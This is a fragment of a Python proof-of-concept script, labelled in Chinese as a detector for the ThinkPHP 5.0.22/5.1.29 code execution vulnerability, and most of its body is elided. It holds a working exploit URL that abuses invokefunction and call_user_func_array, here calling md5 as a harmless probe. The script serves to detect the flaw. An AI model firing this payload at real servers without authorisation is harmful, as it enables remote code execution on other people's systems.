...
def poc(target):
    ...
    try:
        payload = urllib.parse.urljoin(target,r'''/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1''')
...
def main():
    parser = argparse.ArgumentParser("Thinkphp5 5.0.22/5.1.29版本 代码执行漏洞检测POC")
